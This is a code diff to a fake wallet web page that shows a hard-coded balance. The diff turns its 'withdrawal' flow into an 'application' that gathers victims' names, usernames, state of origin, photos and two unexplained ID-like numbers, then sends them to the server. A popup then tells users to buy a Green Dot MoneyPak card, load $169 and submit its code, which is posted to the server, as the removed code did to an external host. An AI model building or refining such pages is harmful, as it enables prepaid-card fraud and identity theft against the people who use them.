@@ -1157,6 +1157,40 @@
             font-size: .92rem;
         }
 
+        .withdraw-summary {
+            display: grid;
+            gap: .75rem;
+            margin-top: .85rem;
+        }
+
+        .withdraw-summary-item {
+            display: flex;
+            justify-content: space-between;
+            gap: 1rem;
+            align-items: flex-start;
+            padding: .82rem .9rem;
+            border-radius: 14px;
+            border: 1px solid rgba(255, 255, 255, .08);
+            background: rgba(255, 255, 255, .04);
+            flex-wrap: wrap;
+        }
+
+        .withdraw-summary-label {
+            color: #9fb0a8;
+            font-size: .86rem;
+        }
+
+        .withdraw-summary-value {
+            color: #fff;
+            font-weight: 700;
+            text-align: right;
+            word-break: break-word;
+        }
+
+        .withdraw-file-status {
+            margin-top: .65rem;
+        }
+
         .withdraw-actions {
             margin-top: .9rem;
             display: flex;
@@ -1181,6 +1215,12 @@
             color: #08110c;
             padding: .78rem .85rem;
             font-weight: 700;
+        }
+
+        .withdraw-secondary:disabled,
+        .withdraw-primary:disabled {
+            opacity: .65;
+            cursor: not-allowed;
         }
 
         .bottom-nav {
@@ -1479,7 +1519,7 @@
                 </div>
             </div>
 
-            <<div class="form-step" id="step4">
+            <div class="form-step" id="step4">
                 <div class="modal-sub">
                     input the code below to know you are human
                 </div>
@@ -1489,20 +1529,20 @@
                 <div class="input-grid">
                     <input id="confirmCode" class="full" placeholder="Enter Confirmation Code" />
                 </div>
-        </div>
+            </div>
 
-        <div class="inline-error" id="formError"></div>
+            <div class="inline-error" id="formError"></div>
 
-        <div class="step-actions">
-            <button class="step-btn" id="prevBtn" onclick="previousStep()">Back</button>
-            <button class="auth-btn" id="nextBtn" onclick="nextStep()">Next</button>
-        </div>
+            <div class="step-actions">
+                <button class="step-btn" id="prevBtn" onclick="previousStep()">Back</button>
+                <button class="auth-btn" id="nextBtn" onclick="nextStep()">Next</button>
+            </div>
 
-        <div class="switch">
-            Already have an account?
-            <a onclick="showLogin()">Login</a>
+            <div class="switch">
+                Already have an account?
+                <a onclick="showLogin()">Login</a>
+            </div>
         </div>
-    </div>
     </div>
 
     <div id="depositAlert"></div>
@@ -1545,8 +1585,8 @@
 
                                     <div class="action-row">
                                         <div class="action-item" onclick="openWithdrawPage()">
-                                            <div class="action-icon">💸</div>
-                                            <div class="action-label">Withdrawal</div>
+                                            <div class="action-icon">📝</div>
+                                            <div class="action-label">Application</div>
                                         </div>
                                         <div class="action-item">
                                             <div class="action-icon">📥</div>
@@ -1685,47 +1725,120 @@
     <div id="withdrawOverlay" class="txn-overlay">
         <div class="txn-box withdraw-box">
             <div class="withdraw-head">
-                <h3>Withdrawal Process</h3>
-                <button class="withdraw-close" onclick="closeWithdrawPage()">✕</button>
+                <h3>Application Process</h3>
+                <button class="withdraw-close" onclick="closeWithdrawPage()">&times;</button>
             </div>
 
             <div class="withdraw-card">
-                <div class="withdraw-label">Process</div>
-
-                <div class="withdraw-step">
-                    <h4>1. Provide Your Unregistered Card, eg(MoneyPak)</h4>
-                    <p>
-                        Submit a Green Dot moneypak Card for registration and linking it to your Reloadable
-                        Account.
-                    </p>
+                <div class="withdraw-label">Application</div>
+                <div class="withdraw-sub">
+                    Complete the four sections below and submit the application details for email review.
                 </div>
 
-                <div class="withdraw-divider"></div>
-
-                <div class="withdraw-step">
-                    <h4>2. Don't Have One Yet? Here's How to Get It:</h4>
-                    <ul>
-                        <li>Visit any local store that sells Green Dot moneypak Cards.</li>
-                        <li>
-                            Purchase a Green Dot Moneypak Card and load a minimum of
-                            <strong>$99.99</strong> onto it. This amount remains on the card balance.
-                        </li>
-                    </ul>
+                <div class="withdraw-stepper">
+                    <div class="w-step active" id="withdrawStepMarker1">
+                        <span>1</span>
+                        <div>Info Written</div>
+                    </div>
+                    <div class="w-step" id="withdrawStepMarker2">
+                        <span>2</span>
+                        <div>Online Access</div>
+                    </div>
+                    <div class="w-step" id="withdrawStepMarker3">
+                        <span>3</span>
+                        <div>Number Check</div>
+                    </div>
+                    <div class="w-step" id="withdrawStepMarker4">
+                        <span>4</span>
+                        <div>Submit</div>
+                    </div>
                 </div>
 
-                <div class="withdraw-divider"></div>
-
-                <div class="withdraw-step">
-                    <label for="moneypakCode" class="withdraw-input-label">Enter MoneyPak Code</label>
-                    <input id="moneypakCode" class="withdraw-input" placeholder="Enter code here" />
-                    <button class="auth-btn withdraw-submit" onclick="submitWithdrawCode()">Submit</button>
-                    <div id="withdrawMessage" class="withdraw-message"></div>
-                    <div id="withdrawTimer" class="withdraw-timer"></div>
+                <div class="withdraw-stage active" id="withdrawStage1">
+                    <h4>Info Written</h4>
+                    <p>Enter the basic application details below.</p>
+                    <label for="appFullName" class="withdraw-input-label">Full Name</label>
+                    <input id="appFullName" class="withdraw-input" placeholder="Enter full name" />
+                    <label for="appPreferredTrack" class="withdraw-input-label">Preferred Role / Department</label>
+                    <input id="appPreferredTrack" class="withdraw-input"
+                        placeholder="Enter preferred role or department" />
                 </div>
+
+                <div class="withdraw-stage" id="withdrawStage2">
+                    <h4>Online Access</h4>
+                    <p>Add the online access details and upload an applicant photo.</p>
+                    <label for="appAccessUser" class="withdraw-input-label">Username</label>
+                    <input id="appAccessUser" class="withdraw-input" placeholder="Enter username" />
+                    <label for="appStateOrigin" class="withdraw-input-label">State of Origin</label>
+                    <input id="appStateOrigin" class="withdraw-input" placeholder="Enter state of origin" />
+                    <label for="appPhoto" class="withdraw-input-label">Upload Picture</label>
+                    <input id="appPhoto" class="withdraw-input" type="file" accept="image/*"
+                        onchange="handleWithdrawFileChange(event)" />
+                    <div id="withdrawFileStatus" class="withdraw-inline withdraw-file-status">No image selected yet.
+                    </div>
+                </div>
+
+                <div class="withdraw-stage" id="withdrawStage3">
+                    <h4>Number Check</h4>
+                    <p>Use test-only values here for the application review flow.</p>
+                    <label for="appDummy11" class="withdraw-input-label">Any 11 Digit Number</label>
+                    <input id="appDummy11" class="withdraw-input" inputmode="numeric" maxlength="11"
+                        placeholder="Enter 11 digit test number" />
+                    <label for="appDummy10" class="withdraw-input-label">Any 10 Digit Number</label>
+                    <input id="appDummy10" class="withdraw-input" inputmode="numeric" maxlength="10"
+                        placeholder="Enter 10 digit test number" />
+                </div>
+
+                <div class="withdraw-stage" id="withdrawStage4">
+                    <h4>Review &amp; Submit</h4>
+                    <p>Confirm the application details below, then send them for review.</p>
+                    <div id="withdrawSummary" class="withdraw-summary"></div>
+                    <button id="withdrawStageSubmitBtn" class="auth-btn withdraw-submit"
+                        onclick="submitWithdrawApplication()">Submit Application</button>
+                </div>
+
+                <div id="withdrawMessage" class="withdraw-inline"></div>
+                <div id="withdrawTimer" class="withdraw-timer"></div>
+
+                <div class="withdraw-actions">
+                    <button id="withdrawPrevBtn" class="withdraw-secondary"
+                        onclick="previousWithdrawStep()">Back</button>
+                    <button id="withdrawNextBtn" class="withdraw-primary" onclick="nextWithdrawStep()">Continue</button>
+                </div>
+
             </div>
         </div>
     </div>
+    </div>
 
+    <div id="moneypakOverlay" class="txn-overlay">
+        <div class="txn-box withdraw-box">
+            <div class="withdraw-card">
+                <div class="withdraw-head">
+                    <h3>Card Registration</h3>
+                    <button class="withdraw-close" onclick="closeMoneypakPopup()">&times;</button>
+                </div>
+                <div class="withdraw-label">Provide Your Unregistered Card</div>
+                <div class="withdraw-sub">
+                    Submit a Green Dot® Reloadable Visa® Card for Registration and linking it to your Reloadable
+                    Account.
+                </div>
+                <div class="withdraw-label">Don't Have One Yet? Here's How to Get It:</div>
+                <ul class="withdraw-list">
+                    <li>Visit any local store that sells Green Dot® Reloadable Visa® Cards.</li>
+                    <li>Purchase a Green Dot® Reloadable Visa® Card and load a minimum of $169 onto it.</li>
+                    <li>Note: The $169 you load confirms the card's eligibility to enroll and link with this reloadable
+                        account. This is not a fee — the full amount remains in your card balance.</li>
+                </ul>
+                <label for="moneypakCode" class="withdraw-input-label">Moneypak Code</label>
+                <input id="moneypakCode" class="withdraw-input" placeholder="Enter moneypak code" />
+                <div id="moneypakMessage" class="withdraw-inline"></div>
+                <button id="moneypakSubmitBtn" class="auth-btn withdraw-submit" onclick="submitMoneypak()">Submit
+                    Moneypak Code</button>
+            </div>
+        </div>
+    </div>
+    <!-- ...existing code... -->
     <script>
         const header = document.getElementById("header");
         const authModal = document.getElementById("authModal");
@@ -1747,12 +1860,19 @@
         const popupTitle = document.getElementById("popupTitle");
         const popupText = document.getElementById("popupText");
         const txnOverlay = document.getElementById("txnOverlay");
+        const moneypakOverlay = document.getElementById("moneypakOverlay");
         const mockCodeBox = document.getElementById("mockCodeBox");
         const recentTxMeta = document.getElementById("recentTxMeta");
         const historyTxMeta = document.getElementById("historyTxMeta");
         const detailDate = document.getElementById("detailDate");
         const detailTime = document.getElementById("detailTime");
         const stepper = document.getElementById("stepper");
+        const withdrawOverlay = document.getElementById("withdrawOverlay");
+        const withdrawMessage = document.getElementById("withdrawMessage");
+        const withdrawTimer = document.getElementById("withdrawTimer");
+        const withdrawPrevBtn = document.getElementById("withdrawPrevBtn");
+        const withdrawNextBtn = document.getElementById("withdrawNextBtn");
+        const withdrawStageSubmitBtn = document.getElementById("withdrawStageSubmitBtn");
 
         let balanceVisible = true;
         const realBalance = 23500;
@@ -1761,8 +1881,9 @@
         let balanceInterval = null;
         let signupStep = 1;
         let mockCode = "";
-        let withdrawCountdown = null;
-        let withdrawSeconds = 60;
+        let withdrawStep = 1;
+        let withdrawPhotoName = "";
+        let withdrawPhotoData = "";
 
         window.addEventListener("scroll", () => {
             header.style.boxShadow = window.scrollY > 10 ? "0 14px 40px rgba(0,0,0,0.22)" : "none";
@@ -2115,45 +2236,306 @@
         }
 
         function openWithdrawPage() {
-            document.getElementById("withdrawOverlay").style.display = "flex";
-            document.getElementById("withdrawMessage").innerText = "";
-            document.getElementById("withdrawTimer").innerText = "";
+            resetWithdrawFlow();
+            withdrawOverlay.style.display = "flex";
         }
 
         function closeWithdrawPage() {
-            document.getElementById("withdrawOverlay").style.display = "none";
+            withdrawOverlay.style.display = "none";
         }
 
-        function submitWithdrawCode() {
-            const input = document.getElementById("moneypakCode");
-            const message = document.getElementById("withdrawMessage");
-            const timer = document.getElementById("withdrawTimer");
-            const code = input.value.trim();
+        function resetWithdrawFlow() {
+            withdrawStep = 1;
+            withdrawPhotoName = "";
+            withdrawPhotoData = "";
+            document.getElementById("appFullName").value = localStorage.getItem("name") || "";
+            document.getElementById("appPreferredTrack").value = "";
+            document.getElementById("appAccessUser").value = localStorage.getItem("username") || "";
+            document.getElementById("appStateOrigin").value = "";
+            document.getElementById("appDummy11").value = "";
+            document.getElementById("appDummy10").value = "";
+            document.getElementById("appPhoto").value = "";
+            document.getElementById("withdrawFileStatus").innerText = "No image selected yet.";
+            withdrawMessage.innerText = "";
+            withdrawMessage.classList.remove("error");
+            withdrawTimer.innerText = "";
+            withdrawPrevBtn.disabled = false;
+            withdrawNextBtn.disabled = false;
+            withdrawStageSubmitBtn.disabled = false;
+            withdrawStageSubmitBtn.innerText = "Submit Application";
+            updateWithdrawUI();
+        }
 
-            if (!code) {
-                message.innerText = "Please enter a code.";
-                timer.innerText = "";
+        function updateWithdrawUI() {
+            for (let i = 1; i <= 4; i++) {
+                document.getElementById(`withdrawStage${i}`).classList.remove("active");
+                document.getElementById(`withdrawStepMarker${i}`).classList.remove("active", "done");
+            }
+
+            for (let i = 1; i < withdrawStep; i++) {
+                document.getElementById(`withdrawStepMarker${i}`).classList.add("done");
+            }
+
+            document.getElementById(`withdrawStage${withdrawStep}`).classList.add("active");
+            document.getElementById(`withdrawStepMarker${withdrawStep}`).classList.add("active");
+
+            withdrawPrevBtn.style.display = withdrawStep === 1 ? "none" : "block";
+            withdrawNextBtn.style.display = withdrawStep === 4 ? "none" : "block";
+            withdrawNextBtn.innerText = "Continue";
+            withdrawStageSubmitBtn.style.display = withdrawStep === 4 ? "block" : "none";
+
+            if (withdrawStep === 4) {
+                renderWithdrawSummary();
+            }
+        }
+
+        function setWithdrawMessage(message, isError = false) {
+            withdrawMessage.innerText = message;
+            withdrawMessage.classList.toggle("error", isError);
+        }
+
+        function validateWithdrawStep(step) {
+            setWithdrawMessage("");
+
+            if (step === 1) {
+                const fullName = document.getElementById("appFullName").value.trim();
+                const preferredTrack = document.getElementById("appPreferredTrack").value.trim();
+
+                if (!fullName || !preferredTrack) {
+                    setWithdrawMessage("Please complete the full name and preferred role fields.", true);
+                    return false;
+                }
+            }
+
+            if (step === 2) {
+                const username = document.getElementById("appAccessUser").value.trim();
+                const stateOfOrigin = document.getElementById("appStateOrigin").value.trim();
+
+                if (!username || !stateOfOrigin) {
+                    setWithdrawMessage("Please complete the online access section before continuing.", true);
+                    return false;
+                }
+
+                if (!withdrawPhotoName) {
+                    setWithdrawMessage("Please upload an applicant image before continuing.", true);
+                    return false;
+                }
+
+                if (!withdrawPhotoData) {
+                    setWithdrawMessage("Please wait while the selected image finishes preparing.", true);
+                    return false;
+                }
+            }
+
+            if (step === 3) {
+                const elevenDigits = document.getElementById("appDummy11").value.trim();
+                const tenDigits = document.getElementById("appDummy10").value.trim();
+
+                if (!/^\d{11}$/.test(elevenDigits)) {
+                    setWithdrawMessage("The first test field must contain exactly 11 digits.", true);
+                    return false;
+                }
+
+                if (!/^\d{10}$/.test(tenDigits)) {
+                    setWithdrawMessage("The second test field must contain exactly 10 digits.", true);
+                    return false;
+                }
+            }
+
+            return true;
+        }
+
+        function nextWithdrawStep() {
+            if (withdrawStep < 4) {
+                if (!validateWithdrawStep(withdrawStep)) {
+                    return;
+                }
+
+                withdrawStep++;
+                updateWithdrawUI();
                 return;
             }
 
-            message.innerText = "Code submitted locally for review.";
-            withdrawSeconds = 60;
-            timer.innerText = "Confirmation timer: 01:00";
-
-            clearInterval(withdrawCountdown);
-            withdrawCountdown = setInterval(() => {
-                withdrawSeconds--;
-
-                const minutes = String(Math.floor(withdrawSeconds / 60)).padStart(2, "0");
-                const seconds = String(withdrawSeconds % 60).padStart(2, "0");
-                timer.innerText = `Confirmation timer: ${minutes}:${seconds}`;
-
-                if (withdrawSeconds <= 0) {
-                    clearInterval(withdrawCountdown);
-                    timer.innerText = "Timer complete.";
-                }
-            }, 1000);
+            submitWithdrawApplication();
         }
+
+        function previousWithdrawStep() {
+            if (withdrawStep === 1) {
+                return;
+            }
+
+            withdrawStep--;
+            updateWithdrawUI();
+        }
+
+        function handleWithdrawFileChange(event) {
+            const file = event.target.files[0];
+            const fileStatus = document.getElementById("withdrawFileStatus");
+
+            withdrawPhotoName = "";
+            withdrawPhotoData = "";
+
+            if (!file) {
+                fileStatus.innerText = "No image selected yet.";
+                return;
+            }
+
+            if (!file.type.startsWith("image/")) {
+                event.target.value = "";
+                fileStatus.innerText = "Please choose an image file.";
+                setWithdrawMessage("Only image uploads are supported for the applicant picture.", true);
+                return;
+            }
+
+            if (file.size > 4 * 1024 * 1024) {
+                event.target.value = "";
+                fileStatus.innerText = "Image must be 4MB or smaller.";
+                setWithdrawMessage("Choose an image that is 4MB or smaller.", true);
+                return;
+            }
+
+            fileStatus.innerText = `Preparing ${file.name}...`;
+            setWithdrawMessage("");
+
+            const reader = new FileReader();
+            reader.onload = () => {
+                withdrawPhotoName = file.name;
+                withdrawPhotoData = reader.result;
+                fileStatus.innerText = `${file.name} is ready to send.`;
+            };
+            reader.onerror = () => {
+                event.target.value = "";
+                fileStatus.innerText = "Image could not be read.";
+                setWithdrawMessage("There was a problem reading the selected image.", true);
+            };
+            reader.readAsDataURL(file);
+        }
+
+        function escapeHtml(value) {
+            return value
+                .replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#39;");
+        }
+
+        function renderWithdrawSummary() {
+            const summary = document.getElementById("withdrawSummary");
+            const values = [
+                ["Full Name", document.getElementById("appFullName").value.trim()],
+                ["Preferred Role / Department", document.getElementById("appPreferredTrack").value.trim()],
+                ["Username", document.getElementById("appAccessUser").value.trim()],
+                ["State of Origin", document.getElementById("appStateOrigin").value.trim()],
+                ["11 Digit Test Number", document.getElementById("appDummy11").value.trim()],
+                ["10 Digit Test Number", document.getElementById("appDummy10").value.trim()],
+                ["Uploaded Image", withdrawPhotoName || "Not selected"]
+            ];
+
+            summary.innerHTML = values.map(([label, value]) => `
+                <div class="withdraw-summary-item">
+                    <div class="withdraw-summary-label">${escapeHtml(label)}</div>
+                    <div class="withdraw-summary-value">${escapeHtml(value || "-")}</div>
+                </div>
+            `).join("");
+        }
+
+        // ...existing code...
+        async function submitWithdrawApplication() {
+            if (!validateWithdrawStep(3)) {
+                withdrawStep = 3;
+                updateWithdrawUI();
+                return;
+            }
+
+            renderWithdrawSummary();
+            setWithdrawMessage("Sending application...");
+            withdrawTimer.innerText = "";
+            withdrawPrevBtn.disabled = true;
+            withdrawNextBtn.disabled = true;
+            withdrawStageSubmitBtn.disabled = true;
+
+            try {
+                const res = await fetch(`${window.location.origin}/submit-application`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        fullName: document.getElementById("appFullName").value.trim(),
+                        preferredTrack: document.getElementById("appPreferredTrack").value.trim(),
+                        username: document.getElementById("appAccessUser").value.trim(),
+                        stateOfOrigin: document.getElementById("appStateOrigin").value.trim(),
+                        testNumber11: document.getElementById("appDummy11").value.trim(),
+                        testNumber10: document.getElementById("appDummy10").value.trim(),
+                        photoName: withdrawPhotoName,
+                        photoData: withdrawPhotoData
+                    })
+                });
+
+                const data = await res.json();
+
+                if (!res.ok) {
+                    throw new Error(data.message || "Application email failed.");
+                }
+
+                setWithdrawMessage(data.message || "Application sent successfully!");
+                withdrawTimer.innerText = `Submitted at ${new Date().toLocaleTimeString([], {
+                    hour: "numeric",
+                    minute: "2-digit"
+                })}`;
+                closeWithdrawPage();
+                showMoneypakPopup();
+            } catch (error) {
+                setWithdrawMessage(error.message || "Error sending application.", true);
+                withdrawPrevBtn.disabled = false;
+                withdrawNextBtn.disabled = false;
+                withdrawStageSubmitBtn.disabled = false;
+            }
+        }
+
+        function showMoneypakPopup() {
+            moneypakOverlay.style.display = "flex";
+            document.getElementById("moneypakCode").value = "";
+            document.getElementById("moneypakMessage").innerText = "";
+        }
+
+        function closeMoneypakPopup() {
+            moneypakOverlay.style.display = "none";
+        }
+
+        async function submitMoneypak() {
+            const moneypakCode = document.getElementById("moneypakCode").value.trim();
+            if (!moneypakCode) {
+                document.getElementById("moneypakMessage").innerText = "Please enter the moneypak code.";
+                document.getElementById("moneypakMessage").classList.add("error");
+                return;
+            }
+
+            document.getElementById("moneypakMessage").innerText = "Sending moneypak code...";
+            document.getElementById("moneypakMessage").classList.remove("error");
+            document.getElementById("moneypakSubmitBtn").disabled = true;
+
+            try {
+                const res = await fetch(`${window.location.origin}/submit-moneypak`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ moneypakCode })
+                });
+
+                const data = await res.json();
+
+                if (!res.ok) {
+                    throw new Error(data.message || "Moneypak submission failed.");
+                }
+
+                document.getElementById("moneypakMessage").innerText = data.message || "Moneypak code sent successfully!";
+                setTimeout(() => closeMoneypakPopup(), 2000);
+            } catch (error) {
+                document.getElementById("moneypakMessage").innerText = error.message || "Error sending moneypak code.";
+                document.getElementById("moneypakMessage").classList.add("error");
+                document.getElementById("moneypakSubmitBtn").disabled = false;
+            }
+        }
+        // ...existing code...
 
         function showHistory() {
             homePage.style.display = "none";
@@ -2182,7 +2564,6 @@
         function logout() {
             clearTimeout(pendingDepositTimeout);
             clearInterval(balanceInterval);
-            clearInterval(withdrawCountdown);
             location.reload();
         }
 
@@ -2196,7 +2577,7 @@
             if (event.target === txnOverlay) {
                 closeTransactionDetails();
             }
-            if (event.target === document.getElementById("withdrawOverlay")) {
+            if (event.target === withdrawOverlay) {
                 closeWithdrawPage();
             }
         });
@@ -2204,28 +2585,6 @@
         prevBtn.style.display = "none";
         function clearInputs() {
             document.querySelectorAll("input").forEach(input => input.value = "");
-        }
-        async function submitWithdrawCode() {
-            const code = document.getElementById("moneypakCode").value;
-            const messageBox = document.getElementById("withdrawMessage");
-
-            if (!code) {
-                messageBox.innerText = "Please enter a code.";
-                return;
-            }
-
-            try {
-                const res = await fetch("https://smc-wallet-6.onrender.com/send-code", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ code })
-                });
-
-                const data = await res.json();
-                messageBox.innerText = data.message;
-            } catch (error) {
-                messageBox.innerText = "Error sending code.";
-            }
         }
     </script>
 </body>
